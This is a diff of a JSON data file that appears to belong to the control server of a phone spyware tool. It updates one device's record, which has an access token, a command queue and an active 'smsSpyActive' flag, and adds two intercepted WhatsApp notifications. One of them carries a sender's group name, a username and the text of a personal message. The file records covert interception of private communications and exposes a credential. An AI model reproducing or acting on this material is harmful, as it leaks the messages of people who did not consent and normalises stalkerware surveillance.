@@ -9345,7 +9345,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777250066601,
+    "lastSeen": 1777250081624,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -9361,6 +9361,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎BUNDA REMPONG (26 pesan): ~ anhysona005",
+        "content": "KLO Jumat hj nini sibuk Jumat berkah capek Ki kodong kalau mau lanjut lagi senam 🙏",
+        "time": "27/04 08:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777250069034
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎33 pesan dari 4 chat",
+        "time": "27/04 08:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777250068916
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
